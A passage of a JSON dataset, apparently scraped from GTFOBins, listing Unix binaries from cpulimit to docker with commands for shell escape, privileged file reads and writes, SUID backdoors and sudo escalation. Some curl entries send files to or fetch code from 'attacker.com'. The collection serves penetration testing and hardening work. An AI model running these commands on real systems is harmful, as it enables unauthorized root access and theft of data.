                        "code": "sudo install -m =xs $(which cpulimit) .\n\n./cpulimit -l 100 -f -- /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo cpulimit -l 100 -f /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "csh",
        "url": "https://gtfobins.github.io/gtfobins/csh/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "csh"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which csh) .\n\n./csh -b"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo csh"
                    }
                ]
            }
        ]
    },
    {
        "name": "crash",
        "url": "https://gtfobins.github.io/gtfobins/crash/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "crash -h\n!sh"
                    }
                ]
            },
            {
                "function": "Command",
                "description": "It can be used to break out from restricted environments by running non-interactive system commands.",
                "examples": [
                    {
                        "description": "",
                        "code": "COMMAND='/usr/bin/id'\nCRASHPAGER=\"$COMMAND\" crash -h"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "sudo crash -h\n!sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "csplit",
        "url": "https://gtfobins.github.io/gtfobins/csplit/",
        "functions": [
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "Writes the data to xx0file_to_write. If needed, a different prefix can be specified with -f (instead of xx).",
                        "code": "TF=$(mktemp)\necho \"DATA\" > $TF\nLFILE=file_to_write\ncsplit -z -b \"%d$LFILE\" $TF 1"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which csplit) .\n\nLFILE=file_to_read\ncsplit $LFILE 1\ncat xx01"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01"
                    }
                ]
            }
        ]
    },
    {
        "name": "csvtool",
        "url": "https://gtfobins.github.io/gtfobins/csvtool/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "csvtool call '/bin/sh;false' /etc/passwd"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.",
                        "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\ncsvtool trim t $TF -o $LFILE"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.",
                        "code": "LFILE=file_to_read\ncsvtool trim t $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which csvtool) .\n\nLFILE=file_to_read\n./csvtool trim t $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo csvtool call '/bin/sh;false' /etc/passwd"
                    }
                ]
            }
        ]
    },
    {
        "name": "crontab",
        "url": "https://gtfobins.github.io/gtfobins/crontab/",
        "functions": [
            {
                "function": "Command",
                "description": "It can be used to break out from restricted environments by running non-interactive system commands.",
                "examples": [
                    {
                        "description": "The commands are executed according to the crontab file edited via the crontab utility.",
                        "code": "crontab -e"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "The commands are executed according to the crontab file edited via the crontab utility.",
                        "code": "sudo crontab -e"
                    }
                ]
            }
        ]
    },
    {
        "name": "cupsfilter",
        "url": "https://gtfobins.github.io/gtfobins/cupsfilter/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which cupsfilter) .\n\nLFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "curl",
        "url": "https://gtfobins.github.io/gtfobins/curl/",
        "functions": [
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the @ to send hard-coded data.",
                        "code": "URL=http://attacker.com/\nLFILE=file_to_send\ncurl -X POST -d \"@$LFILE\" $URL"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request.",
                        "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\ncurl $URL -o $LFILE"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file path must be absolute.",
                        "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\ncurl \"file://$TF\" -o \"$LFILE\""
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file path must be absolute.",
                        "code": "LFILE=/tmp/file_to_read\ncurl file://$LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request.",
                        "code": "sudo install -m =xs $(which curl) .\n\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request.",
                        "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "cut",
        "url": "https://gtfobins.github.io/gtfobins/cut/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ncut -d \"\" -f1 \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which cut) .\n\nLFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "dash",
        "url": "https://gtfobins.github.io/gtfobins/dash/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "dash"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "export LFILE=file_to_write\ndash -c 'echo DATA > $LFILE'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which dash) .\n\n./dash -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo dash"
                    }
                ]
            }
        ]
    },
    {
        "name": "date",
        "url": "https://gtfobins.github.io/gtfobins/date/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.\n\nThis only works for the GNU variant of date."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ndate -f $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which date) .\n\nLFILE=file_to_read\n./date -f $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo date -f $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "debugfs",
        "url": "https://gtfobins.github.io/gtfobins/debugfs/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "debugfs\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which debugfs) .\n\n./debugfs\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo debugfs\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "dd",
        "url": "https://gtfobins.github.io/gtfobins/dd/",
        "functions": [
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\necho \"DATA\" | dd of=$LFILE"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ndd if=$LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which dd) .\n\nLFILE=file_to_write\necho \"data\" | ./dd of=$LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "dc",
        "url": "https://gtfobins.github.io/gtfobins/dc/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "dc -e '!/bin/sh'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo dc -e '!/bin/sh'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which dc) .\n\n./dc -e '!/bin/sh'"
                    }
                ]
            }
        ]
    },
    {
        "name": "dialog",
        "url": "https://gtfobins.github.io/gtfobins/dialog/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The file is shown in an interactive TUI dialog, thus it is not suitable for binary/too big data."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ndialog --textbox \"$LFILE\" 0 0"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which dialog) .\n\nLFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0"
                    }
                ]
            }
        ]
    },
    {
        "name": "diff",
        "url": "https://gtfobins.github.io/gtfobins/diff/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE"
                    },
                    {
                        "description": "This lists the content of a directory. $TF can be any directory, but for convenience it is better to use an empty directory to avoid noise output.",
                        "code": "LFOLDER=folder_to_list\nTF=$(mktemp -d)\ndiff --recursive $TF $LFOLDER"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which diff) .\n\nLFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "dig",
        "url": "https://gtfobins.github.io/gtfobins/dig/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "Each input line is treated as a lookup query for the dig command and the output is corrupted with the result or errors of the operation, so this may not be suitable for binary files. Grepping for DiG might help to filter out unwanted content."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ndig -f $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which dig) .\n\nLFILE=file_to_read\n./dig -f $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo dig -f $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "distcc",
        "url": "https://gtfobins.github.io/gtfobins/distcc/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "distcc /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which distcc) .\n\n./distcc /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo distcc /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "dmesg",
        "url": "https://gtfobins.github.io/gtfobins/dmesg/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "dmesg -H\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "This is not suitable for binary files.",
                        "code": "LFILE=file_to_read\ndmesg -rF \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "sudo dmesg -H\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "dmidecode",
        "url": "https://gtfobins.github.io/gtfobins/dmidecode/",
        "functions": [
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\nIt can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode. Generate the file with dmiwrite and upload it to the target.\n\n• --dump-bin, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.\n\n• --no-sysfs, if the target system is using an older version of dmidecode, you may need to omit the option.",
                "examples": [
                    {
                        "description": "",
                        "code": "make dmiwrite\nTF=$(mktemp)\necho \"DATA\" > $TF\n./dmiwrite $TF x.dmi"
                    },
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "dos2unix",
        "url": "https://gtfobins.github.io/gtfobins/dos2unix/",
        "functions": [
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE1=file_to_read\nLFILE2=file_to_write\ndos2unix -f -n \"$LFILE1\" \"$LFILE2\""
                    }
                ]
            }
        ]
    },
    {
        "name": "dosbox",
        "url": "https://gtfobins.github.io/gtfobins/dosbox/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "Basically dosbox allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention (8.3) is used."
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "Note that the name of the written file in the following example will be FILE_TO_. Also note that echo terminates the string with a DOS-style line terminator (\\r\\n), if that’s a problem and your scenario allows it, you can create the file outside dosbox, then use copy to do the actual write.",
                        "code": "LFILE='\\path\\to\\file_to_write'\ndosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file content will be displayed in the DOSBox graphical window.",
                        "code": "LFILE='\\path\\to\\file_to_read'\ndosbox -c 'mount c /' -c \"type c:$LFILE\""
                    },
                    {
                        "description": "The file is copied to a readable location.",
                        "code": "LFILE='\\path\\to\\file_to_read'\ndosbox -c 'mount c /' -c \"copy c:$LFILE c:\\tmp\\output\" -c exit\ncat '/tmp/OUTPUT'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "Note that the name of the written file in the following example will be FILE_TO_. Also note that echo terminates the string with a DOS-style line terminator (\\r\\n), if that’s a problem and your scenario allows it, you can create the file outside dosbox, then use copy to do the actual write.",
                        "code": "sudo install -m =xs $(which dosbox) .\n\nLFILE='\\path\\to\\file_to_write'\n./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "Note that the name of the written file in the following example will be FILE_TO_. Also note that echo terminates the string with a DOS-style line terminator (\\r\\n), if that’s a problem and your scenario allows it, you can create the file outside dosbox, then use copy to do the actual write.",
                        "code": "LFILE='\\path\\to\\file_to_write'\nsudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit"
                    }
                ]
            }
        ]
    },
    {
        "name": "dnf",
        "url": "https://gtfobins.github.io/gtfobins/dnf/",
        "functions": [
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "It runs commands using a specially crafted RPM package. Generate it with fpm and upload it to the target.",
                        "code": "TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF"
                    }
                ]
            }
        ]
    },
    {
        "name": "dotnet",
        "url": "https://gtfobins.github.io/gtfobins/dotnet/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "export LFILE=file_to_read\ndotnet fsi\nSystem.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(\"LFILE\"));;"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;"
                    }
                ]
            }
        ]
    },
    {
        "name": "docker",
        "url": "https://gtfobins.github.io/gtfobins/docker/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This requires the user to be privileged enough to run docker, i.e. being in the docker group or being root.\n\nAny other Docker Linux image should work, e.g., debian."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "The resulting is a root shell.",
                        "code": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "Write a file by copying it to a temporary container and back to the target destination on the host.",
